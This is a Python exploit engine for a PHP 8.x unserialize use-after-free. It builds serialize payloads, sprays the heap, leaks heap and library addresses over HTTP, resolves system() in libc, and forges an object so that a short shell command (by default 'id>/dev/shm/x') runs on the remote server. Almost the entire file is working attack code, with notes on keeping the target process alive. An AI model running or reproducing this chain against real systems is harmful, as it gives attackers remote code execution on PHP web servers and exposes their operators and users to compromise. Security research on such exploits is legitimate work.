#!/usr/bin/env python3
# INDEX: var_hash-uaf system() rce engine | all | pure | serialize+unserialize | free
"""PHP 8.x unserialize Serializable var_hash use-after-free -> remote RCE engine.

Offset-free and fully remote (no /proc, no gdb, no ASLR-off): leaks a heap pointer,
scans back to libphp's ELF, resolves executor_globals + GOT via .gnu_hash, finds
libc and system(), reads the class table and spray slot, then forges a stdClass
whose get_properties_for handler is system() with a <=14-byte command in the GC
header. SAPI-general; requires an unserialize()+echo-serialize sink.
CVE-2026-109618 / CVE-2026-109619. Command-exec path ported from the public PoC
iQingshan/php2shell (php8_remote.py). Reuses the shared symbol-resolver
primitive for its .gnu_hash window lookup and class-table read, over this
engine's own read backend.
"""

PATH = "/remote_app.php"   # target endpoint (set by run_chain)
HOST = "127.0.0.1"
PORT = 80

import argparse
import importlib.util
import os
import socket
import struct
import sys
import time


# Loader for sibling primitive modules (poc-root-relative, _HERE/_POC_ROOT
# fallback so it resolves whether imported as a package module or exec'd by
# path via spec_from_file_location).

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, relpath):
    """Load a sibling primitive module by its poc-root-relative path."""
    path = os.path.join(_HERE, relpath)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# Constants and configuration

SPRAY_LEN = 280
SPRAY_COUNT = 32
NUM_PROPS = 8
REF_BASE = 4
MAX_REFS = 8

# get_properties_for = last field of zend_object_handlers. 8.5 (this engine's
# native build): sizeof(std_object_handlers) == 208 -> 200 (0xC8).
GPF_HANDLER_OFF = 200

# WORKER SURVIVAL. The fire points the forged object's get_properties_for
# handler at libc system(); its RETURN VALUE (the shell wait-status) is handed
# back to the engine AS the prop_ht HashTable*. A command that exits 0 -> status
# 0 -> prop_ht = NULL. EXIT0_WRAP forces that zero exit by appending ";true"
# when it fits the 14-byte command budget.
#
# SCOPE: exit0 keeps the worker alive ONLY when the app dispatch sink null-checks
# get_properties_for's return before using it -- get_object_vars(), (array)$o,
# foreach, var_export (`call zend_get_properties_for; test %rax,%rax; je ...`).
# A serialize() ECHO sink does NOT null-check: it runs
# `call zend_get_properties_for; mov %rax,%rdi; call zend_array_count`, and
# zend_array_count derefs rdi+8 immediately. prop_ht = NULL (exit 0) OR a
# small-int (nonzero exit) both fault there, and system() can NEVER return a
# valid HashTable*, so the serialize-sink fire SIGSEGVs regardless of exit code
# -- a structural limit, not an exit-code artifact.
# Set EXIT0_WRAP = False (or pass exit0_wrap=False) for the crash-and-spray
# fire. The out-of-band marker lands either way (system() runs before the fault).
EXIT0_WRAP = True

# 48-bit cap covers x86_64 (47-bit canonical) and aarch64 (48-bit VA).
ADDR_MAX = 0x0000FFFFFFFFFFFF


req_count = 0
crash_count = 0


# Inner serialize payload (the var_hash UAF gadget)

def _build_inner():
    props = ''
    for k in range(NUM_PROPS):
        pname = f"p{k}"
        props += f's:{len(pname)}:"{pname}";i:{0xAAAA0000 + k};'
    return f'O:8:"stdClass":{NUM_PROPS}:{{{props}}}'


INNER = _build_inner()
C_PART = f'C:10:"CachedData":{len(INNER)}:{{{INNER}}}'


# Helpers: HTTP transport, ASCII URL encoding

def urlencode_bytes(data):
    out = bytearray()
    for b in data:
        if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
            out.append(b)
        else:
            out.extend(f'%{b:02X}'.encode())
    return bytes(out)


def send_http(payload, host=None, port=None, timeout=3):
    """POST a serialize payload to remote_app.php, return body bytes or None."""
    if host is None:
        host = HOST
    if port is None:
        port = PORT
    global req_count
    req_count += 1
    body = b'cook=' + urlencode_bytes(payload)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    for attempt in range(2):
        try:
            s.connect((host, port))
            break
        except Exception:
            if attempt == 0:
                time.sleep(0.2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        s.sendall(req)
    except Exception:
        return None
    resp = b''
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        except Exception:
            break
    s.close()
    if b'\r\n\r\n' in resp:
        hdr, body_data = resp.split(b'\r\n\r\n', 1)
        if b' 500 ' in hdr.split(b'\r\n')[0]:
            return None
        return body_data
    return resp


# Hash functions: GNU-hash (libc/libphp .gnu_hash), DJBX33A (PHP HashTable).
# The .gnu_hash window lookup and the class-table reader that call these live
# in the symbol_resolver primitive (wired below); these two helpers stay here.

def gnu_hash_func(name):
    h = 5381
    for c in name:
        h = (h * 33 + c) & 0xFFFFFFFF
    return h


def php_djb_hash(key):
    h = 5381
    for c in key:
        h = ((h << 5) + h + c) & 0xFFFFFFFFFFFFFFFF
    return h


# UAF primitives

def isstring_read(fake_str_addr, timeout=5):
    """Forge a zend_string at fake_str_addr by overwriting one bucket's val
    with that pointer and IS_STRING type. Returns (len, data) or None on crash.
    """
    global crash_count
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    vo = 8 + 1 * 32
    struct.pack_into('<Q', spray, vo, fake_str_addr)
    struct.pack_into('<I', spray, vo + 8, 0x06)
    spray = bytes(spray)
    total = 1 + SPRAY_COUNT + 1
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    parts.append(f'i:{SPRAY_COUNT+1};R:{REF_BASE};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload, timeout=timeout)
    if output is None:
        crash_count += 1
        if crash_count % 5 == 0:
            time.sleep(0.5)
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    key = f'i:{SPRAY_COUNT+1};s:'.encode()
    pos = output.find(key)
    if pos < 0:
        return None
    pos += len(key)
    colon = output.index(b':', pos)
    slen = int(output[pos:colon])
    dstart = colon + 2
    dend = dstart + slen
    if dend <= len(output):
        return (slen, output[dstart:dend])
    return (slen, output[dstart:])


# Shared symbol-resolver primitive. isstring_read is installed as the resolver's
# read backend, so the engine reuses the resolver's pure .gnu_hash window lookup
# and its class-table reader instead of carrying forks of them.
#
# The ELF base scan + symbol-resolve chain (scan_for_elf / gnu_hash_resolve /
# _elf_resolve_symbols / _elf_read_window) lives in the elf_resolver primitive
# over the same isstring_read backend and this engine's default ELF window; a
# downstream SAPI (fpm) supplies its own gap-safe window via set_read_window,
# which reaches _elf_resolve_symbols without a module-global swap. libc discovery
# keeps its libphp-nearby cluster scan here and uses the got_pltrelsz_read helper
# for the shared GOT-read sub-step.
#
# isstring_read already bumps this module's req_count/crash_count (and self-rate-
# limits); the resolver's _backend_read keeps its own separate counters, so a
# failed read during a resolve advances both -- benign diagnostic double-count.
_resolver = _load("symbol_resolver", "primitives/read_leak/symbol_resolver.py")
_resolver.set_read_backend(isstring_read)
gnu_hash_lookup_window = _resolver.gnu_hash_lookup_window
lookup_class_table = _resolver.lookup_class_table

# Canonical dispatch primitives (spray-slot scan + fire-payload builder). The
# module-global find_spray_slot / _fire_cmd below delegate to these; they stay
# reassignable so the fpm/apache/shim drivers can still monkeypatch them.
_dispatch_spray = _load("dispatch_spray", "primitives/dispatch/spray_slot.py")
_dispatch_fire = _load("dispatch_fire", "primitives/dispatch/fire.py")

# ELF base scan + .gnu_hash resolve chain, over this engine's read backend and
# its default ELF window. The got_pltrelsz_read helper reads the GOT for libc
# discovery (and for the fpm/apache routes) from the same resolver.
_elf = _load("elf_resolver", "primitives/read_leak/elf_resolver.py")
_elf.set_read_backend(isstring_read)
_elf.set_req_source(lambda: req_count)
_gotread = _load("got_pltrelsz_read", "primitives/read_leak/got_pltrelsz_read.py")
_gotread.set_resolver(_elf)


def heap_leak():
    """Spray, attach R: ref to a sprayed bucket, recover the heap pointer
    that ZVAL_MAKE_REF wrote on top of the spray contents.
    """
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    spray = bytes(spray)
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{REF_BASE+k};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload)
    if output is None:
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    search_pos = 0
    while True:
        pos = output.find(b's:280:"', search_pos)
        if pos < 0:
            break
        dstart = pos + 7
        if dstart + SPRAY_LEN > len(output):
            break
        sdata = output[dstart:dstart + SPRAY_LEN]
        for k in range(7):
            bucket_idx = k + 1
            vo = 8 + bucket_idx * 32
            if vo + 8 > len(sdata):
                break
            orig = struct.unpack_from('<Q', spray, vo)[0]
            curr = struct.unpack_from('<Q', sdata, vo)[0]
            if orig != curr and curr > 0x10000:
                return curr
        search_pos = dstart + SPRAY_LEN
    return None


# ELF probing helpers (libphp base scan + libc discovery).
# The scan + resolve chain lives in the elf_resolver primitive over this
# engine's isstring_read backend and its default ELF window; the names below
# stay reassignable wrappers so the fpm/apache/shim drivers that reference them
# keep working. libc_from_got_dump keeps its libphp-nearby cluster scan here and
# reads the GOT through the got_pltrelsz_read helper.

def _read_elf_header(addr, timeout=2):
    return _elf._read_elf_header(addr, timeout=timeout)


def _elf_phnum_from_data(sdata):
    return _elf._elf_phnum_from_data(sdata)


def _find_elf_base(ptr, max_pages=256, timeout=2, max_crash=8):
    return _elf._find_elf_base(ptr, max_pages=max_pages, timeout=timeout,
                               max_crash=max_crash)


def _elf_read_window(base, phnum):
    return _elf._elf_read_window(base, phnum)


def _elf_resolve_symbols(base, phnum, names):
    return _elf._elf_resolve_symbols(base, phnum, names)


def scan_for_elf(chunk):
    return _elf.scan_for_elf(chunk)


def gnu_hash_resolve(elf_base, *names):
    return _elf.gnu_hash_resolve(elf_base, *names)


def libc_from_got_dump(elf_base, pltgot):
    """Read libphp's .dynamic via DT_PLTRELSZ as a fake-string len, dump
    the GOT, cluster external pointers, scan back to libc's ELF base.

    Returns the libc ELF base, or None on failure.
    """
    print("\n[Phase R-4] Libc discovery via GOT dump")

    got_data, data_start = _gotread.read_got_via_pltrelsz(isstring_read, elf_base)
    if got_data is None:
        return None
    got_addr = pltgot
    print(f"    GOT read: {len(got_data)} bytes")

    libphp_end = elf_base + 0x1800000

    # Collect external pointers (outside libphp) clustered by ~0.5MB proximity.
    ext_ptrs = []
    if got_addr >= data_start and got_addr < data_start + len(got_data):
        for gi in range(0, len(got_data) - 7, 8):
            ptr = struct.unpack_from('<Q', got_data, gi)[0]
            if ptr < 0x100000000 or ptr > ADDR_MAX:
                continue
            if elf_base <= ptr < libphp_end:
                continue
            if not any(abs(ptr - ep) < 0x80000 for ep in ext_ptrs):
                ext_ptrs.append(ptr)
    else:
        # GOT not in the read window; fall back to scanning everything.
        for qi in range(0, len(got_data) - 7, 8):
            ptr = struct.unpack_from('<Q', got_data, qi)[0]
            if ptr < 0x100000000 or ptr > ADDR_MAX:
                continue
            if abs(ptr - elf_base) > 0x2000000:
                if not any(abs(ptr - ep) < 0x200000 for ep in ext_ptrs):
                    ext_ptrs.append(ptr)

    # Prefer pointers near libphp (avoids vDSO / Apache binary that sit far away).
    nearby = [p for p in ext_ptrs if abs(p - elf_base) < 0x10000000]
    nearby.sort()
    print(f"    External pointer groups: {len(ext_ptrs)} total, {len(nearby)} nearby")

    # For each cluster pointer, scan backward in 4KB steps for an ELF magic.
    # Search far->near so r-- regions get probed first (fewer crashes).
    for nidx, ep in enumerate(nearby):
        print(f"    Trying nearby[{nidx}] = 0x{ep:x}")
        page = ep & ~0xFFF
        # Coarse scan with descending offsets.
        for est_off in range(0x7F000, 0x1F000, -0x1000):
            cand = page - est_off
            if cand <= 0:
                continue
            epn = _read_elf_header(cand)
            if epn is None:
                continue
            print(f"      ELF @ 0x{cand:x} (phnum={epn}, est_off=0x{est_off:x})")
            if epn >= 12:
                # libc has many phdrs; try to resolve `system` here.
                syms = _elf_resolve_symbols(cand, epn, ['system'])
                if syms and 'system' in syms:
                    print(f"      libc @ 0x{cand:x}, system @ 0x{syms['system']:x}")
                    return cand
        # Fallback: standard backward 4KB scan over more pages.
        result = _find_elf_base(ep, max_pages=128)
        if result:
            ebase, epn, _ = result
            print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
            syms = _elf_resolve_symbols(ebase, epn, ['system'])
            if syms and 'system' in syms:
                print(f"      libc @ 0x{ebase:x}, system @ 0x{syms['system']:x}")
                return ebase

    return None


def _is_spray_read(r):
    """True iff an isstring_read result r=(slen, data) is one of our live 280B
    spray strings.

    Checks the length AND the recognisable bucket pattern that heap_leak /
    isstring_read write into every spray (val[8:12] == 0xBBBB0000, i.e. little-
    endian b'\\x00\\x00\\xbb\\xbb', and val[72:76] == 0xBBBB0002 — buckets k=0
    and k=2; k=1 at offset 40 is the one overwritten with the fake-string ptr).
    Matching on the signature, not just slen==280, stops a coincidental
    280-length allocation from being mistaken for a spray slot: a wrong S would
    make the fire forge land its stdClass in unrelated memory and misfire.
    """
    if r is None:
        return False
    slen, data = r
    if slen != SPRAY_LEN or len(data) < 76:
        return False
    return data[8:12] == b'\x00\x00\xbb\xbb' and data[72:76] == b'\x02\x00\xbb\xbb'


def find_spray_slot(heap_ref):
    """Locate the 280-byte spray run and return the absolute address `S`
    (the data pointer of a spray string, where the fire forges its stdClass).

    Two strategies, map-based fast path first:

      (A) MAP-BASED (fast path, works on 8.5.11/8.5.12). Walk the ZendMM page
          map and probe every in-use run page (SRUN of any bin, or LRUN) at the
          320B slot stride; likely homes (a bin-320 SRUN, or a 1-page LRUN)
          first. Classification differs per build —
            8.5.11: page 117 is a bin-320 SRUN  (info & 0x1F == 16)
            8.5.12: page 117 is a 1-page LRUN   (info == 0x40000001)
          — so we DO NOT filter on the bin index.

      (B) CRASH-TOLERANT INFO-AGNOSTIC PROBE (fallback, 8.1-8.4). There the
          freed inner-object arData is reclaimed by the spray but its page-map
          word reads 0, so (A) skips the run entirely. Probe the chunk at the
          320B stride directly, with NO reliance on the map, biased to the upper
          used region just above the payload buffers where the reclaimed spray
          run sits (empirically pages ~88 and ~117/118, slots 3..15). A valid
          slot is recognised by the 280B spray signature (_is_spray_read).

          Crash tolerance: a non-spray slot whose +0x10 qword is a huge bogus
          "length" (0xffffffff…, a heap/libphp ptr, or urlencoded-payload ASCII)
          makes the echo-serialize oracle stream megabytes / SIGSEGV, so the
          forged read returns None (500/drop, or truncated past the DEFAULT
          timeout) — we skip it and continue. The prefork/fpm worker respawns
          byte-identical, so each such miss costs only one request. Total probes
          are bounded. CRITICAL: the DEFAULT read timeout is used throughout — a
          short timeout truncates valid 280B reads too (every read, real sprays
          included, comes back None), so it is never shortened here.
    """
    print(f"\n[Phase R-6] Spray slot discovery")
    chunk_base = heap_ref & ~0x1FFFFF
    print(f"  chunk_base = 0x{chunk_base:x}")

    req0, crash0 = req_count, crash_count
    # Bias the scan to the upper used region just above the payload buffers
    # (empirically pages ~88 and ~117/118); the canonical scan consults the
    # ZendMM page map first (use_map) and recognises a slot by the 280B spray
    # signature (_is_spray_read).
    band = [p for p in range(80, 160)]
    S = _dispatch_spray.find_spray_slot_scan(
        isstring_read, chunk_base, match=_is_spray_read, band=band,
        with_offset=False, use_map=True, probe_budget=900)
    if S is not None:
        print(f"  spray slot @ S=0x{S:x} "
              f"({req_count - req0} reqs, {crash_count - crash0} crashes)")
    else:
        print(f"  [R-6] no spray slot found "
              f"({req_count - req0} reqs, {crash_count - crash0} crashes)")
    return S


def exit0(cmd14):
    """Budget-aware worker-survival wrap. Append ';true' so the fired command
    exits 0 -> system() returns status 0 -> prop_ht=NULL -> clean HTTP 200,
    worker ALIVE. Only wraps
    when it fits the 14-byte command budget (base command <= 9 bytes); otherwise
    returns the command UNCHANGED, so the caller falls back to crash-and-spray
    for that command (report which commands can't fit). A command that already
    exits 0 by construction (e.g. a `cmd>file` redirect) needs no wrap, but the
    wrap is still appended when it fits for belt-and-braces."""
    if isinstance(cmd14, str):
        cmd14 = cmd14.encode("latin-1")
    if not cmd14.endswith(b";true") and len(cmd14) + 5 <= 14:
        cmd14 = cmd14 + b";true"
    return cmd14


def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14, exit0_wrap=None):
    """One fire trigger: forge a stdClass whose handlers->get_properties_for
    is libc system() and whose first 16 bytes (the gc header) are the shell
    command. cmd14 is at most 14 bytes; a leading 0x09 is prepended so that
    GC_ADDREF's +1 turns it into 0x0A (newline, ignored by sh).

    exit0_wrap: None -> use the module EXIT0_WRAP flag (default True); True/False
    -> force/disable the ';true' worker-survival wrap for this fire.
    """
    do_wrap = EXIT0_WRAP if exit0_wrap is None else exit0_wrap
    payload = _dispatch_fire.build_fire_payload(
        ce_stdclass, system_addr, spray_addr, cmd14, GPF_HANDLER_OFF,
        spray_len=SPRAY_LEN, spray_count=SPRAY_COUNT, c_part=C_PART,
        ref_base=REF_BASE, exit0_wrap=do_wrap)
    output = send_http(payload)
    time.sleep(0.3)
    return output






def trigger_rce(ce_stdclass, system_addr, spray_addr, cmd):
    """Fire single-shot: run one command (max 14 bytes after the GC byte)."""
    print(f"\n[Phase R-7] Type confusion to libc system()")
    print(f"  stdClass ce = 0x{ce_stdclass:x}")
    print(f"  system()    = 0x{system_addr:x}")
    print(f"  S           = 0x{spray_addr:x}")
    print(f"  Command (after GC_ADDREF): \\n{cmd[1:].decode('latin-1', errors='replace')}")
    print(f"  Sending RCE payload...")
    output = _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd[1:])
    if output is not None:
        print(f"  IN-BAND SUCCESS: HTTP 200 reflected ({len(output)} bytes), "
              f"worker SURVIVED: {output[:200]!r}")
    else:
        print(f"  No in-band response (worker crashed/dropped the connection; "
              f"with EXIT0_WRAP the fire should return a clean 200)")
    return output is not None








def run_chain(host, port, path="/remote_app.php", cmd=b"id>/dev/shm/x"):
    """Drive the full leak -> resolve -> fire for a single <=14-byte command.
    Returns True if the fire request was delivered (verify the effect
    out-of-band on the target,
    e.g. the command wrote a marker file). Sets the module target globals."""
    global HOST, PORT, PATH
    HOST, PORT, PATH = host, port, path
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")
    heap_ref = heap_leak()
    if not heap_ref:
        return False
    chunk = heap_ref & ~0x1FFFFF
    elf_candidates = scan_for_elf(chunk)
    if not elf_candidates:
        return False
    elf_base = eg = pltgot = None
    for base, phnum in elf_candidates:
        try:
            eg, pltgot = gnu_hash_resolve(base, "executor_globals",
                                          "_GLOBAL_OFFSET_TABLE_")
        except RuntimeError:
            continue
        elf_base = base
        break
    if elf_base is None:
        return False
    libc_base = libc_from_got_dump(elf_base, pltgot)
    if libc_base is None:
        return False
    system_addr = gnu_hash_resolve(libc_base, "system")
    ce_stdclass = lookup_class_table(eg, "stdclass")
    if ce_stdclass is None:
        return False
    spray_addr = find_spray_slot(heap_ref)
    if spray_addr is None:
        return False
    return trigger_rce(ce_stdclass, system_addr, spray_addr, b"\x09" + cmd)
